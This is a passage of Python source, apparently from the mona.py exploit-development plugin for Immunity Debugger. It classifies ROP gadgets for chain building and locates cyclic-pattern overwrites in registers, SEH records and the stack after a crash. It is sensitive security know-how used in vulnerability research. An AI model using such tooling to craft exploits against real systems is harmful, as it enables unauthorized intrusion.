	regs = ["EAX","EBX","ECX","EDX","EBP","ESI","EDI"]
	pushad_allowed = [ "INC ","DEC ","OR ","XOR ","LEA ","ADD ","SUB ", "PUSHAD", "RETN ", "NOP", "POP ","PUSH EAX","PUSH EDI","ADC ","FPATAN","MOV E" ]
	for r in regs:
		pushad_allowed.append("MOV "+r+",DWORD PTR DS:[ESP")	#stack
		pushad_allowed.append("MOV "+r+",DWORD PTR SS:[ESP")	#stack
		pushad_allowed.append("MOV "+r+",DWORD PTR DS:[ESI")	#virtualprotect
		pushad_allowed.append("MOV "+r+",DWORD PTR SS:[ESI")	#virtualprotect
		pushad_allowed.append("MOV "+r+",DWORD PTR DS:[EBP")	#stack
		pushad_allowed.append("MOV "+r+",DWORD PTR SS:[EBP")	#stack
		for r2 in regs:
			pushad_allowed.append("MOV "+r+","+r2)
			pushad_allowed.append("XCHG "+r+","+r2)
			pushad_allowed.append("LEA "+r+","+r2)
	pushad_notallowed = ["POP ESP","POPAD","PUSH ESP","MOV ESP","ADD ESP", "INC ESP","DEC ESP","XOR ESP","LEA ESP","SS:","DS:"]
	for gadget in ropchains:
		gadgetinstructions = ropchains[gadget].strip()
		if gadgetinstructions.find("PUSHAD") == 2:
			# does chain only contain allowed instructions
			# one pop is allowed, as long as it's not pop esp
			# push edi and push eax are allowed too (ropnop)
			if gadgetinstructions.count("POP ") < 2 and suggestedGadgetCheck(gadgetinstructions,pushad_allowed,pushad_notallowed):
				toadd={}
				toadd[gadget] = gadgetinstructions
				if not "pushad" in suggestions:
					suggestions["pushad"] = toadd
				else:
					suggestions["pushad"] = mergeOpcodes(suggestions["pushad"],toadd)
	# pick up a pointer
	# =========================
	pickedupin = []
	resulthash = ""
	allowedpickup = True
	for r in regs:
		for r2 in regs:
			pickup_allowed = ["NOP","RETN ","INC ","DEC ","OR ","XOR ","MOV ","LEA ","ADD ","SUB ","POP","ADC ","FPATAN"]
			pickup_target = []
			pickup_notallowed = []
			pickup_allowed.append("MOV "+r+",DWORD PTR SS:["+r2+"]")
			pickup_allowed.append("MOV "+r+",DWORD PTR DS:["+r2+"]")
			pickup_target.append("MOV "+r+",DWORD PTR SS:["+r2+"]")
			pickup_target.append("MOV "+r+",DWORD PTR DS:["+r2+"]")
			pickup_notallowed = ["POP "+r, "MOV "+r+",E", "LEA "+r+",E", "MOV ESP", "XOR ESP", "LEA ESP", "MOV DWORD PTR", "DEC ESP"]
			for gadget in ropchains:
				gadgetinstructions = ropchains[gadget].strip()	
				allowedpickup = False
				for allowed in pickup_target:
					if gadgetinstructions.find(allowed) == 2 and gadgetinstructions.count("DWORD PTR") == 1:
						allowedpickup = True
				if allowedpickup:
					if suggestedGadgetCheck(gadgetinstructions,pickup_allowed,pickup_notallowed):
						toadd={}
						toadd[gadget] = gadgetinstructions
						resulthash = "pickup pointer into "+r.lower()
						if not resulthash in suggestions:
							suggestions[resulthash] = toadd
						else:
							suggestions[resulthash] = mergeOpcodes(suggestions[resulthash],toadd)
						if not r in pickedupin:
							pickedupin.append(r)
	if len(pickedupin) == 0:
		for r in regs:
			for r2 in regs:
				pickup_allowed = ["NOP","RETN ","INC ","DEC ","OR ","XOR ","MOV ","LEA ","ADD ","SUB ","POP", "ADC ","FPATAN"]
				pickup_target = []
				pickup_notallowed = []
				pickup_allowed.append("MOV "+r+",DWORD PTR SS:["+r2+"+")
				pickup_allowed.append("MOV "+r+",DWORD PTR DS:["+r2+"+")
				pickup_target.append("MOV "+r+",DWORD PTR SS:["+r2+"+")
				pickup_target.append("MOV "+r+",DWORD PTR DS:["+r2+"+")
				pickup_notallowed = ["POP "+r, "MOV "+r+",E", "LEA "+r+",E", "MOV ESP", "XOR ESP", "LEA ESP", "MOV DWORD PTR"]
				for gadget in ropchains:
					gadgetinstructions = ropchains[gadget].strip()	
					allowedpickup = False
					for allowed in pickup_target:
						if gadgetinstructions.find(allowed) == 2 and gadgetinstructions.count("DWORD PTR") == 1:
							allowedpickup = True
					if allowedpickup:
						if suggestedGadgetCheck(gadgetinstructions,pickup_allowed,pickup_notallowed):
							toadd={}
							toadd[gadget] = gadgetinstructions
							resulthash = "pickup pointer into "+r.lower()
							if not resulthash in suggestions:
								suggestions[resulthash] = toadd
							else:
								suggestions[resulthash] = mergeOpcodes(suggestions[resulthash],toadd)
							if not r in pickedupin:
								pickedupin.append(r)
	# move pointer into another pointer
	# =================================
	for reg in regs:	#from
		for reg2 in regs:	#to
			if reg != reg2:
				moveptr_allowed = ["NOP","RETN","POP ","INC ","DEC ","OR ","XOR ","ADD ","PUSH ","AND ", "XCHG ", "ADC ","FPATAN"]
				moveptr_notallowed = ["POP "+reg2,"MOV "+reg2+",","XCHG "+reg2+",","XOR "+reg2,"LEA "+reg2+",","AND "+reg2,"DS:","SS:","PUSHAD","POPAD", "DEC ESP"]
				suggestions = mergeOpcodes(suggestions,getRegToReg("MOVE",reg,reg2,ropchains,moveptr_allowed,moveptr_notallowed))
		reg2 = "ESP"	#special case
		if reg != reg2:
			moveptr_allowed = ["NOP","RETN","POP ","INC ","DEC ","OR ","XOR ","ADD ","PUSH ","AND ", "MOV ", "XCHG ", "ADC "]
			moveptr_notallowed = ["ADD "+reg2, "ADC "+reg2, "POP "+reg2,"MOV "+reg2+",","XCHG "+reg2+",","XOR "+reg2,"LEA "+reg2+",","AND "+reg2,"DS:","SS:","PUSHAD","POPAD", "DEC ESP"]
			suggestions = mergeOpcodes(suggestions,getRegToReg("MOVE",reg,reg2,ropchains,moveptr_allowed,moveptr_notallowed))
			
	# xor pointer into another pointer
	# =================================
	for reg in regs:	#from
		for reg2 in regs:	#to
			if reg != reg2:
				xorptr_allowed = ["NOP","RETN","POP ","INC ","DEC ","OR ","XOR ","ADD ","PUSH ","AND ", "XCHG ", "ADC ","FPATAN"]
				xorptr_notallowed = ["POP "+reg2,"MOV "+reg2+",","XCHG "+reg2+",","XOR "+reg2,"LEA "+reg2+",","AND "+reg2,"DS:","SS:","PUSHAD","POPAD", "DEC ESP"]
				suggestions = mergeOpcodes(suggestions,getRegToReg("XOR",reg,reg2,ropchains,xorptr_allowed,xorptr_notallowed))
			
			
	# get stack pointer
	# =================
	for reg in regs:
		moveptr_allowed = ["NOP","RETN","POP ","INC ","DEC ","OR ","XOR ","ADD ","PUSH ","AND ","MOV ", "ADC ","FPATAN"]
		moveptr_notallowed = ["POP ESP","MOV ESP,","XCHG ESP,","XOR ESP","LEA ESP,","AND ESP", "ADD ESP", "],","SUB ESP","OR ESP"]
		moveptr_notallowed.append("POP "+reg)
		moveptr_notallowed.append("MOV "+reg)
		moveptr_notallowed.append("XCHG "+reg)
		moveptr_notallowed.append("XOR "+reg)
		moveptr_notallowed.append("LEA "+reg)
		moveptr_notallowed.append("AND "+reg)
		suggestions = mergeOpcodes(suggestions,getRegToReg("MOVE","ESP",reg,allchains,moveptr_allowed,moveptr_notallowed))
	# add something to register
	# =========================
	for reg in regs:	#from
		for reg2 in regs:	#to
			if reg != reg2:
				moveptr_allowed = ["NOP","RETN","POP ","INC ","DEC ","OR ","XOR ","ADD ","PUSH ","AND ", "ADC ","FPATAN"]
				moveptr_notallowed = ["POP "+reg2,"MOV "+reg2+",","XCHG "+reg2+",","XOR "+reg2,"LEA "+reg2+",","AND "+reg2,"DS:","SS:", "DEC ESP"]
				suggestions = mergeOpcodes(suggestions,getRegToReg("ADD",reg,reg2,ropchains,moveptr_allowed,moveptr_notallowed))
	# add value to register
	# =========================
	for reg in regs:	#to
		moveptr_allowed = ["NOP","RETN","POP ","INC ","DEC ","OR ","XOR ","ADD ","PUSH ","AND ", "ADC ", "SUB ","FPATAN"]
		moveptr_notallowed = ["POP "+reg,"MOV "+reg+",","XCHG "+reg+",","XOR "+reg,"LEA "+reg+",","DS:","SS:", "DEC ESP"]
		suggestions = mergeOpcodes(suggestions,getRegToReg("ADDVAL",reg,reg,ropchains,moveptr_allowed,moveptr_notallowed))	

	#inc reg
	# =======
	for reg in regs:
		moveptr_allowed = ["NOP","RETN","POP ","INC " + reg,"DEC ","OR ","XOR ","ADD ","PUSH ","AND ", "ADC ", "SUB ","FPATAN"]
		moveptr_notallowed = ["POP "+reg,"MOV "+reg+",","XCHG "+reg+",","XOR "+reg,"LEA "+reg+",","DS:","SS:", "DEC ESP", "DEC "+reg]
		suggestions = mergeOpcodes(suggestions,getRegToReg("INC",reg,reg,ropchains,moveptr_allowed,moveptr_notallowed))
		
	#dec reg
	# =======
	for reg in regs:
		moveptr_allowed = ["NOP","RETN","POP ","DEC " + reg,"INC ","OR ","XOR ","ADD ","PUSH ","AND ", "ADC ", "SUB ","FPATAN"]
		moveptr_notallowed = ["POP "+reg,"MOV "+reg+",","XCHG "+reg+",","XOR "+reg,"LEA "+reg+",","DS:","SS:", "DEC ESP", "INC "+reg]
		suggestions = mergeOpcodes(suggestions,getRegToReg("DEC",reg,reg,ropchains,moveptr_allowed,moveptr_notallowed))		
	# pop
	# ===
	for reg in regs:
		pop_allowed = "POP "+reg+" # RETN"
		pop_notallowed = []
		for gadget in ropchains:
			gadgetinstructions = ropchains[gadget].strip()
			if gadgetinstructions.find(pop_allowed) == 2:
				resulthash = "pop "+reg.lower()
				toadd = {}
				toadd[gadget] = gadgetinstructions
				if not resulthash in suggestions:
					suggestions[resulthash] = toadd
				else:
					suggestions[resulthash] = mergeOpcodes(suggestions[resulthash],toadd)
					
	# check if we have a pop for each reg
	for reg in regs:
		r = reg.lower()
		if not "pop "+r in suggestions:
			pop_notallowed = ["MOV "+reg+",","XCHG "+reg+",","XOR "+reg,"LEA "+reg+",","DS:","SS:", "DEC ESP", "DEC "+reg, "INC " + reg,"PUSH ","XOR "+reg]
			for rchain in ropchains:
				rparts = ropchains[rchain].strip().split("#")
				chainok = False
				if rparts[1].strip() == "POP " + reg:
						chainok = True
				if chainok:
					for rpart in rparts:
						thisinstr = rpart.strip()
						for pna in pop_notallowed:
							if thisinstr.find(pna) > -1:
								chainok = False
								break
				if chainok:
					toadd = {}
					toadd[rchain] = thisinstr				
					if not "pop " + r in suggestions:
						suggestions["pop " + r] = toadd
					else:
						suggestions["pop " + r] = mergeOpcodes(suggestions["pop " + r],toadd)
	# neg
	# ===
	for reg in regs:
		neg_allowed = "NEG "+reg+" # RETN"
		neg_notallowed = []
		for gadget in ropchains:
			gadgetinstructions = ropchains[gadget].strip()
			if gadgetinstructions.find(neg_allowed) == 2:
				resulthash = "neg "+reg.lower()
				toadd = {}
				toadd[gadget] = gadgetinstructions
				if not resulthash in suggestions:
					suggestions[resulthash] = toadd
				else:
					suggestions[resulthash] = mergeOpcodes(suggestions[resulthash],toadd)		
	# empty
	# =====
	for reg in regs:
		empty_allowed = ["XOR "+reg+","+reg+" # RETN","MOV "+reg+",FFFFFFFF # INC "+reg+" # RETN", "SUB "+reg+","+reg+" # RETN", "PUSH 0 # POP "+reg + " # RETN", "IMUL "+reg+","+reg+",0 # RETN"]
		empty_notallowed = []
		for gadget in ropchains:
			gadgetinstructions = ropchains[gadget].strip()
			for empty in empty_allowed:
				if gadgetinstructions.find(empty) == 2:
					resulthash = "empty "+reg.lower()
					toadd = {}
					toadd[gadget] = gadgetinstructions
					if not resulthash in suggestions:
						suggestions[resulthash] = toadd
					else:
						suggestions[resulthash] = mergeOpcodes(suggestions[resulthash],toadd)						
	return suggestions

def getRegToReg(type,fromreg,toreg,ropchains,moveptr_allowed,moveptr_notallowed):
	moveptr = []
	instrwithout = ""
	toreg = toreg.upper()
	srcval = False
	resulthash = ""
	musthave = ""
	if type == "MOVE":
		moveptr.append("MOV "+toreg+","+fromreg)
		moveptr.append("LEA "+toreg+","+fromreg)
		#if not (fromreg == "ESP" or toreg == "ESP"):
		moveptr.append("XCHG "+fromreg+","+toreg)
		moveptr.append("XCHG "+toreg+","+fromreg)
		moveptr.append("PUSH "+fromreg)
		moveptr.append("ADD "+toreg+","+fromreg)
		moveptr.append("ADC "+toreg+","+fromreg)		
		moveptr.append("XOR "+toreg+","+fromreg)
	if type == "XOR":
		moveptr.append("XOR "+toreg+","+fromreg)		
	if type == "ADD":
		moveptr.append("ADD "+toreg+","+fromreg)
		moveptr.append("ADC "+toreg+","+fromreg)		
		moveptr.append("XOR "+toreg+","+fromreg)
	if type == "ADDVAL":
		moveptr.append("ADD "+toreg+",")
		moveptr.append("ADC "+toreg+",")		
		moveptr.append("XOR "+toreg+",")		
		srcval = True
		resulthash = "add value to " + toreg
	if type == "INC":
		moveptr.append("INC "+toreg)
		resulthash = "inc " + toreg
	if type == "DEC":
		moveptr.append("DEC "+toreg)
		resulthash = "dec " + toreg		
	results = {}
	if resulthash == "":
		resulthash = type +" "+fromreg+" -> "+toreg
	resulthash = resulthash.lower()
	for tocheck in moveptr:
		for gadget in ropchains:
			gadgetinstructions = ropchains[gadget].strip()
			if gadgetinstructions.find(tocheck) == 2:
				moveon = True
				if srcval:
					#check if src is a value
					inparts = gadgetinstructions.split(",")
					if len(inparts) > 1:
						subinparts = inparts[1].split(" ")
						if isHexString(subinparts[0].strip()):
							tocheck = tocheck + subinparts[0].strip()
						else:
							moveon = False						
				if moveon:	
					instrwithout = gadgetinstructions.replace(tocheck,"")
					if tocheck == "PUSH "+fromreg:
						popreg = instrwithout.find("POP "+toreg)
						popall = instrwithout.find("POP")
						#make sure pop matches push
						nrpush = gadgetinstructions.count("PUSH ")
						nrpop = gadgetinstructions.count("POP ")
						pushpopmatch = False
						if nrpop >= nrpush:
							pushes = []
							pops = []
							ropparts = gadgetinstructions.split(" # ")
							pushindex = 0
							popindex = 0
							cntpush = 0
							cntpop = nrpush
							for parts in ropparts:
								if parts.strip() != "":
									if parts.strip().find("PUSH ") > -1:
										pushes.append(parts)
										if parts.strip() == "PUSH "+fromreg:
											cntpush += 1
									if parts.strip().find("POP ") > -1:
										pops.append(parts)
										if parts.strip() == "POP "+toreg:
											cntpop -= 1
							if cntpush == cntpop:
								#imm.log("%s : POPS : %d, PUSHES : %d, pushindex : %d, popindex : %d" % (gadgetinstructions,len(pops),len(pushes),pushindex,popindex))
								#imm.log("push at %d, pop at %d" % (cntpush,cntpop))
								pushpopmatch = True
						if (popreg == popall) and instrwithout.count("POP "+toreg) == 1 and pushpopmatch:
							toadd={}
							toadd[gadget] = gadgetinstructions
							if not resulthash in results:
								results[resulthash] = toadd
							else:
								results[resulthash] = mergeOpcodes(results[resulthash],toadd)
					else:			
						if suggestedGadgetCheck(instrwithout,moveptr_allowed,moveptr_notallowed):
							toadd={}
							toadd[gadget] = gadgetinstructions
							if not resulthash in results:
								results[resulthash] = toadd
							else:
								results[resulthash] = mergeOpcodes(results[resulthash],toadd)
	return results
	
def suggestedGadgetCheck(instructions,allowed,notallowed):
	individual = instructions.split("#")
	cnt = 0
	allgood = True
	toskip = False
	while (cnt < len(individual)-1) and allgood:	# do not check last one, which is the ending instruction
		thisinstr = individual[cnt].upper()
		if thisinstr.strip() != "":
			toskip = False
			foundinstruction = False
			for notok in notallowed:
				if thisinstr.find(notok) > -1:
					toskip= True 
			if not toskip:
				for ok in allowed:
					if thisinstr.find(ok) > -1:
						foundinstruction = True
				allgood = foundinstruction
			else:
				allgood = False
		cnt += 1
	return allgood

def dumpMemoryToFile(address,size,filename):
	"""
	Dump 'size' bytes of memory to a file
	
	Arguments:
	address  - the address where to read
	size     - the number of bytes to read
	filename - the name of the file where to write the file
	
	Return:
	Boolean - True if the write succeeded
	"""

	WRITE_SIZE = 10000
	
	imm.log("Dumping %d bytes from address 0x%08x to %s..."	% (size, address, filename))
	out = open(filename,'wb')
	
	# write by increments of 10000 bytes
	current = 0
	while current < size :
		bytesToWrite = size - current
		if ( bytesToWrite >= WRITE_SIZE):
			bytes = imm.readMemory(address+current,WRITE_SIZE)
			out.write(bytes)
			current += WRITE_SIZE
		else:
			bytes = imm.readMemory(address+current,bytesToWrite)
			out.write(bytes)
			current += bytesToWrite
	out.close()
	
	return True
		

def goFindMSP(distance = 0,args = {}):
	"""
	Finds all references to cyclic pattern in memory
	
	Arguments:
	None
	
	Return:
	Dictonary with results of the search operation
	"""
	results = {}
	regs = imm.getRegs()
	criteria = {}
	criteria["accesslevel"] = "*"
	
	tofile = ""
	
	global silent
	oldsilent = silent
	silent=True	
	
	fullpattern = createPattern(50000,args)
	factor = 1
	
	#are we attached to an application ?
	if imm.getDebuggedPid() == 0:
		imm.log("*** Attach to an application, and trigger a crash with a cyclic pattern ! ***",highlight=1)
		return	{}
	
	#1. find beging of metasploit pattern in memory ?

	patbegin = createPattern(6,args)
	
	silent=oldsilent
	pattypes = ["normal","unicode","lower","upper"]
	if not silent:
		imm.log("[+] Looking for cyclic pattern in memory")
	tofile += "[+] Looking for cyclic pattern in memory\n"
	for pattype in pattypes:
		imm.updateLog()
		searchPattern = []
		#create search pattern
		factor = 1
		if pattype == "normal":
			searchPattern.append([patbegin, patbegin])	
		if pattype == "unicode":
			patbegin_unicode = ""
			factor = 0.5
			for pbyte in patbegin:
				patbegin_unicode += pbyte + "\x00"
			searchPattern.append([patbegin_unicode, patbegin_unicode])	
		if pattype == "lower":
			searchPattern.append([patbegin.lower(), patbegin.lower()])	
		if pattype == "upper":
			searchPattern.append([patbegin.upper(), patbegin.upper()])	
		#search
		pointers = searchInRange(searchPattern,0,TOP_USERLAND,criteria)
		memory={}
		if len(pointers) > 0:
			for ptrtypes in pointers:
				for ptr in pointers[ptrtypes]:
					#get size
					thissize = getPatternLength(ptr,pattype,args)
					if thissize > 0:
						if not silent:
							imm.log("    Cyclic pattern (%s) found at 0x%s (length %d bytes)" % (pattype,toHex(ptr),thissize))
						tofile += "    Cyclic pattern (%s) found at 0x%s (length %d bytes)\n" % (pattype,toHex(ptr),thissize)
						if not ptr in memory:
							memory[ptr] = ([thissize,pattype])
					#get distance from ESP
					if "ESP" in regs:
						thisesp = regs["ESP"]
						thisptr = MnPointer(ptr)
						if thisptr.isOnStack():
							if ptr > thisesp:
								if not silent:
									imm.log("    -  Stack pivot between %d & %d bytes needed to land in this pattern" % (ptr-thisesp,ptr-thisesp+thissize))
								tofile += "    -  Stack pivot between %d & %d bytes needed to land in this pattern\n" % (ptr-thisesp,ptr-thisesp+thissize)
			if not "memory" in results:
				results["memory"] = memory
			
	#2. registers overwritten ?
	if not silent:
		imm.log("[+] Examining registers")
	registers = {}
	registers_to = {}
	for reg in regs:
		for pattype in pattypes:
			imm.updateLog()		
			regpattern = fullpattern
			hexpat = toHex(regs[reg])
			factor = 1
			hexpat = toAscii(hexpat[6]+hexpat[7])+toAscii(hexpat[4]+hexpat[5])+toAscii(hexpat[2]+hexpat[3])+toAscii(hexpat[0]+hexpat[1])
			if pattype == "upper":
				regpattern = regpattern.upper()
			if pattype == "lower":
				regpattern = regpattern.lower()
			if pattype == "unicode":
				regpattern = toUnicode(regpattern)
				factor = 0.5
				
			offset = regpattern.find(hexpat)
			if offset > -1:
				if pattype == "unicode":
					offset = offset * factor
				if not silent:
					imm.log("    %s overwritten with %s pattern : 0x%s (offset %d)" % (reg,pattype,toHex(regs[reg]),offset))
				tofile += "    %s overwritten with %s pattern : 0x%s (offset %d)\n" % (reg,pattype,toHex(regs[reg]),offset)
				if not reg in registers:
					registers[reg] = ([regs[reg],offset,pattype])

					
			# maybe register points into metasploit pattern
			mempat = ""
			try:
				mempat = imm.readMemory(regs[reg],4)
			except:
				pass
			
			if mempat != "":
				if pattype == "normal":
					regpattern = fullpattern
				if pattype == "upper":
					regpattern = fullpattern.upper()
				if pattype == "lower":
					regpattern = fullpattern.lower()
				if pattype == "unicode":
					mempat = imm.readMemory(regs[reg],8)
					mempat = mempat.replace('\x00','')
					
				offset = regpattern.find(mempat)
				
				if offset > -1:				
					thissize = getPatternLength(regs[reg],pattype,args)
					if thissize > 0:
						if not silent:
							imm.log("    %s (0x%s) points at offset %d in %s pattern (length %d)" % (reg,toHex(regs[reg]),offset,pattype,thissize))
						tofile += "    %s (0x%s) points at offset %d in %s pattern (length %d)\n" % (reg,toHex(regs[reg]),offset,pattype,thissize)
						if not reg in registers_to:
							registers_to[reg] = ([regs[reg],offset,thissize,pattype])
						else:
							registers_to[reg] = ([regs[reg],offset,thissize,pattype])
							
	if not "registers" in results:
		results["registers"] = registers
	if not "registers_to" in results:
		results["registers_to"] = registers_to

	#3. SEH record overwritten ?
	seh = {}
	if not silent:
		imm.log("[+] Examining SEH chain")
	tofile += "[+] Examining SEH chain\r\n"
	thissehchain=imm.getSehChain()
	
	for chainentry in thissehchain:
		for pattype in pattypes:
			imm.updateLog()		
			regpattern = fullpattern
			hexpat = toHex(chainentry[1])
			hexpat = toAscii(hexpat[6]+hexpat[7])+toAscii(hexpat[4]+hexpat[5])+toAscii(hexpat[2]+hexpat[3])+toAscii(hexpat[0]+hexpat[1])
			factor = 1
			goback = 4
			if pattype == "upper":
				regpattern = regpattern.upper()
			if pattype == "lower":
				regpattern = regpattern.lower()
			if pattype == "unicode":
				#regpattern = toUnicode(regpattern)
				#get next 4 bytes too
				hexpat = imm.readMemory(chainentry[0],8)
				hexpat = hexpat.replace('\x00','')
				goback = 2
	
			offset = regpattern.find(hexpat)-goback
			thissize = 0
			if offset > -1:		
				thepointer = MnPointer(chainentry[0])
				if thepointer.isOnStack():
					thissize = getPatternLength(chainentry[0]+4,pattype)
					if thissize > 0:
						if not silent:
							imm.log("    SEH record (nseh field) at 0x%s overwritten with %s pattern : 0x%s (offset %d), followed by %d bytes of cyclic data" % (toHex(chainentry[0]),pattype,toHex(chainentry[1]),offset,thissize))
						tofile += "    SEH record (nseh field) at 0x%s overwritten with %s pattern : 0x%s (offset %d), followed by %d bytes of cyclic data\n" % (toHex(chainentry[0]),pattype,toHex(chainentry[1]),offset,thissize)
						if not chainentry[0]+4 in seh:
							seh[chainentry[0]+4] = ([chainentry[1],offset,pattype,thissize])
							
	if not "seh" in results:
		results["seh"] = seh

	stack = {}	
	stackcontains = {}
	
	#4. walking stack
	if "ESP" in regs:	
		curresp = regs["ESP"]	
		if not silent:
			if distance == 0:
				extratxt = "(entire stack)"
			else:
				extratxt = "(+- "+str(distance)+" bytes)"
			imm.log("[+] Examining stack %s - looking for cyclic pattern" % extratxt)
		tofile += "[+] Examining stack %s - looking for cyclic pattern\n" % extratxt
		
		# get stack this address belongs to
		stacks = getStacks()
		thisstackbase = 0
		thisstacktop = 0
		if distance < 1:
			for tstack in stacks:
				if (stacks[tstack][0] < curresp) and (curresp < stacks[tstack][1]):
					thisstackbase = stacks[tstack][0]
					thisstacktop = stacks[tstack][1]
		else:
			thisstackbase = curresp - distance
			thisstacktop = curresp + distance + 8
		stackcounter = thisstackbase
		sign=""

	
		if not silent:
			imm.log("    Walking stack from 0x%s to 0x%s (0x%s bytes)" % (toHex(stackcounter),toHex(thisstacktop-4),toHex(thisstacktop-4-stackcounter)))
		tofile += "    Walking stack from 0x%s to 0x%s (0x%s bytes)\n" % (toHex(stackcounter),toHex(thisstacktop-4),toHex(thisstacktop-4-stackcounter))

		# stack contains part of a cyclic pattern ?
		while stackcounter < thisstacktop-4:
			espoffset = stackcounter - curresp
			stepsize = 4
			imm.updateLog()	
			if espoffset > -1:
				sign="+"			
			else:
				sign="-"	
				
			cont = imm.readMemory(stackcounter,4)
			
			if len(cont) == 4:
				contat = cont
				if contat <> "":
		
					for pattype in pattypes:
						imm.updateLog()
						regpattern = fullpattern
						
						hexpat = contat
					
						if pattype == "upper":
							regpattern = regpattern.upper()
						if pattype == "lower":
							regpattern = regpattern.lower()
						if pattype == "unicode":
							hexpat1 = imm.readMemory(stackcounter,4)
							hexpat2 = imm.readMemory(stackcounter+4,4)
							hexpat1 = hexpat1.replace('\x00','')
							hexpat2 = hexpat2.replace('\x00','')
							if hexpat1 == "" or hexpat2 == "":
								#no unicode
								hexpat = ""
								break
							else:
								hexpat = hexpat1 + hexpat2
						
						if len(hexpat) == 4:
							
							offset = regpattern.find(hexpat)
							
							currptr = stackcounter
							
							if offset > -1:				
								thissize = getPatternLength(currptr,pattype)
								offsetvalue = int(str(espoffset).replace("-",""))								
								if thissize > 0:
									stepsize = thissize
									if thissize/4*4 != thissize:
										stepsize = (thissize/4*4) + 4
									# align stack again
									if not silent:
										espoff = 0
										espsign = "+"
										if ((stackcounter + thissize) >= curresp):
											espoff = (stackcounter + thissize) - curresp
										else:
											espoff = curresp - (stackcounter + thissize)
											espsign = "-"											
										imm.log("    0x%s : Contains %s cyclic pattern at ESP%s0x%s (%s%s) : offset %d, length %d (-> 0x%s : ESP%s0x%s)" % (toHex(stackcounter),pattype,sign,rmLeading(toHex(offsetvalue),"0"),sign,offsetvalue,offset,thissize,toHex(stackcounter+thissize-1),espsign,rmLeading(toHex(espoff),"0")))
									tofile += "    0x%s : Contains %s cyclic pattern at ESP%s0x%s (%s%s) : offset %d, length %d (-> 0x%s : ESP%s0x%s)\n" % (toHex(stackcounter),pattype,sign,rmLeading(toHex(offsetvalue),"0"),sign,offsetvalue,offset,thissize,toHex(stackcounter+thissize-1),espsign,rmLeading(toHex(espoff),"0"))
									if not currptr in stackcontains:
										stackcontains[currptr] = ([offsetvalue,sign,offset,thissize,pattype])
								else:
									#if we are close to ESP, change stepsize to 1
									if offsetvalue <= 256:
										stepsize = 1
			stackcounter += stepsize
			

			
		# stack has pointer into cyclic pattern ?
		if not silent:
			if distance == 0:
				extratxt = "(entire stack)"
			else:
				extratxt = "(+- "+str(distance)+" bytes)"
			imm.log("[+] Examining stack %s - looking for pointers to cyclic pattern" % extratxt)	
		tofile += "[+] Examining stack %s - looking for pointers to cyclic pattern\n" % extratxt
		# get stack this address belongs to
		stacks = getStacks()
		thisstackbase = 0
		thisstacktop = 0
		if distance < 1:
			for tstack in stacks:
				if (stacks[tstack][0] < curresp) and (curresp < stacks[tstack][1]):
					thisstackbase = stacks[tstack][0]
					thisstacktop = stacks[tstack][1]
		else:
			thisstackbase = curresp - distance
			thisstacktop = curresp + distance + 8
		stackcounter = thisstackbase
		sign=""		
		
		if not silent:
			imm.log("    Walking stack from 0x%s to 0x%s (0x%s bytes)" % (toHex(stackcounter),toHex(thisstacktop-4),toHex(thisstacktop-4-stackcounter)))
		tofile += "    Walking stack from 0x%s to 0x%s (0x%s bytes)\n" % (toHex(stackcounter),toHex(thisstacktop-4),toHex(thisstacktop-4-stackcounter))
		while stackcounter < thisstacktop-4:
			espoffset = stackcounter - curresp
			
			imm.updateLog()	
			if espoffset > -1:
				sign="+"			
			else:
				sign="-"	
				
			cont = imm.readMemory(stackcounter,4)
			
			if len(cont) == 4:
				cval=""				
				for sbytes in cont:
					tval = hex(ord(sbytes)).replace("0x","")
					if len(tval) < 2:
						tval="0"+tval
					cval = tval+cval
				try:				
					contat = imm.readMemory(hexStrToInt(cval),4)
				except:
					contat = ""	
					
				if contat <> "":
					for pattype in pattypes:
						imm.updateLog()
						regpattern = fullpattern
						
						hexpat = contat
					
						if pattype == "upper":
							regpattern = regpattern.upper()
						if pattype == "lower":
							regpattern = regpattern.lower()
						if pattype == "unicode":
							hexpat1 = imm.readMemory(stackcounter,4)
							hexpat2 = imm.readMemory(stackcounter+4,4)
							hexpat1 = hexpat1.replace('\x00','')
							hexpat2 = hexpat2.replace('\x00','')
							if hexpat1 == "" or hexpat2 == "":
								#no unicode
								hexpat = ""
								break
							else:
								hexpat = hexpat1 + hexpat2
						
						if len(hexpat) == 4:
							offset = regpattern.find(hexpat)
							currptr = hexStrToInt(cval)
							
							if offset > -1:				
								thissize = getPatternLength(currptr,pattype)
								if thissize > 0:
									offsetvalue = int(str(espoffset).replace("-",""))
									if not silent:
										imm.log("    0x%s : Pointer into %s cyclic pattern at ESP%s0x%s (%s%s) : 0x%s : offset %d, length %d" % (toHex(stackcounter),pattype,sign,rmLeading(toHex(offsetvalue),"0"),sign,offsetvalue,toHex(currptr),offset,thissize))
									tofile += "    0x%s : Pointer into %s cyclic pattern at ESP%s0x%s (%s%s) : 0x%s : offset %d, length %d\n" % (toHex(stackcounter),pattype,sign,rmLeading(toHex(offsetvalue),"0"),sign,offsetvalue,toHex(currptr),offset,thissize)
									if not currptr in stack:
										stack[currptr] = ([offsetvalue,sign,offset,thissize,pattype])					
							
			stackcounter += 4
	else:
		imm.log("** Are you connected to an application ?",highlight=1)
		
	if not "stack" in results:
		results["stack"] = stack
	if not "stackcontains" in results:
		results["stackcontains"] = stack
		
	if tofile != "":
		objfindmspfile = MnLog("findmsp.txt")
		findmspfile = objfindmspfile.reset()
		objfindmspfile.write(tofile,findmspfile)
	return results
	
	
#-----------------------------------------------------------------------#
# convert arguments to criteria
#-----------------------------------------------------------------------#

def args2criteria(args,modulecriteria,criteria):

	imm.logLines("\n---------- Mona command started on %s ----------" % datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
	imm.log("[+] Processing arguments and criteria")
	global ptr_to_get
	
	# meets access level ?
	criteria["accesslevel"] = "X"
	if "x" in args : 
		if not args["x"].upper() in ["*","R","RW","RX","RWX","W","WX","X"]:
			imm.log("invalid access level : %s" % args["x"], highlight=1)
			criteria["accesslevel"] = ""
		else:
			criteria["accesslevel"] = args["x"].upper()
		
	imm.log("    - Pointer access level : %s" % criteria["accesslevel"])
	
	# query OS modules ?
	if "o" in args and args["o"]:
		modulecriteria["os"] = False
		imm.log("    - Ignoring OS modules")
	
	# allow nulls ?
	if "n" in args and args["n"]:
		criteria["nonull"] = True
		imm.log("    - Ignoring pointers that have null bytes")
	
	# override list of modules to query ?
	if "m" in args:
		if type(args["m"]).__name__.lower() <> "bool":
			modulecriteria["modules"] = args["m"]
			imm.log("    - Only querying modules %s" % args["m"])
				
	# limit nr of pointers to search ?
	if "p" in args:
		if str(args["p"]).lower() != "true":
			ptr_to_get = int(args["p"].strip())
		if ptr_to_get > 0:	
